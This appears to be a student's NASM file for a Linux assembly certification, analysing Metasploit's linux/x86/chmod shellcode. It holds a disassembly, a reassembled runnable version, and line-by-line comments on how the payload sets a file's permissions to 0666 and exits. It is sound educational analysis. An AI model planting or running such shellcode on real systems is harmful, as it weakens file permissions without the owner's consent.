; Filename: msfchmod.nasm
; Author: Leandro Kyrkiris
; Date: April 2014
; Scope: Securitytube Linux Assembly Expert Certification
; Assignment: 5, Metasploit shellcode analysis


; --------------------------------------------------------------------
; Dump of the original Shellcode
; Output of running
; sudo msfpayload -p linux/x86/chmod FILE=./file.txt R | ndisasm -u -
; 
; NOTE: The strace tool does not work with this shellcode, therefore
; 	manual analysis is required.
; --------------------------------------------------------------------
;
;                            cdq
;00000001  6A0F              push byte +0xf
;00000003  58                pop eax
;00000004  52                push edx
;00000005  E80B000000        call dword 0x15
;0000000A  2E2F              cs das
;0000000C  66696C652E7478    imul bp,[ebp+0x2e],word 0x7874
;00000013  7400              jz 0x15
;00000015  5B                pop ebx
;00000016  68B6010000        push dword 0x1b6
;0000001B  59                pop ecx
;0000001C  CD80              int 0x80
;0000001E  6A01              push byte +0x1
;00000020  58                pop eax
;00000021  CD80              int 0x80



; --------------------------------------------
; Extracted shellcode and ready for execution
; --------------------------------------------
global _start

section .text
_start:

	cdq
	push byte +0xf
	pop eax
	push edx
	call dword 0x15		; Jump 15 bytes ahead (represented by label 'here')
	cs das
	imul bp,[ebp+0x2e],word 0x7874
	jz 0x15
here:
	pop ebx
	push dword 0x1b6
	pop ecx
	int 0x80
	push byte +0x1
	pop eax
	int 0x80


; -----------------------
;  SHELLCODE  ANALYSIS
; -----------------------

; Output of running
; sudo msfpayload -p linux/x86/chmod FILE=./file.txt R | ndisasm -u -


; The first 4 instructions clear the value of eax and edx,
; then eax is assigned the value 0xf for system call chmod()
; and a null byte is pushed to the stack

; The next instruction tells nasm to execute the code that lies 0x15 bytes
; ahead by using call 0x15 (this location is the pop ebx instruction


; After the call instruction is the code that represents the string "./file.txt"	
; It has to be somewhere, right?
; we recognize the 2f charachter as the /, and furthermore
; after the call instruction, the address of the 2E2F instruction is
; popped to the ebx register, making it point to that value.

; We can verify what are the bytes required to push the string "./file.txt"
; using python like so:

; >>> st='./file.txt'
; >>> pushed=st.encode('hex')
; >>> print pushed
; 2e2f66696c652e747874


; These are the exact bytes that are in the middle of the payload,
; between the call 0x15 and pop ebx instructions.
; This makes sense, since now ebx points to the beggining of the string
; The 00 after the last 74 is the null termination character.


; The apparent junk instructions are then the interpretation nasm gives 
; to the bytes that make up the filename we want to chmod.


; The value that is pushed and popped to ecx, 0x1b6
; is the hex equivalent to octal number 666,
; wich, in the context of chmod sets the rw-rw-rw permissions
; read and write for all.


; Finally, the program finishes by calling exit() (eax = 1)
; and uses the return value currently in ebx

; This concludes the analysis of this Metaspooit shellcode
